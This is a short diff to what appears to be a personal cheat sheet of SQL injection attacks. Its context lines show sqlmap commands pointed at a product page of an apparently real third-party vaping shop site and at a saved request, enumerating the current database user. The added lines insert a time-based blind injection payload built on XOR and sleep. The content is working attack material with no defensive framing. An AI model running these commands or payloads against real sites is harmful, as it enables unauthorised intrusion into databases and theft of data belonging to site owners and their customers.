@@ -41,3 +41,7 @@ sqlmap -u "https://www.vapingjoint.com/product.php?cat=6" --random-agent --keep-
 ```command
 sqlmap -p log -r request-cz.txt --current-user --level=2 --risk=2
 ```
+
+```
+'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
+```
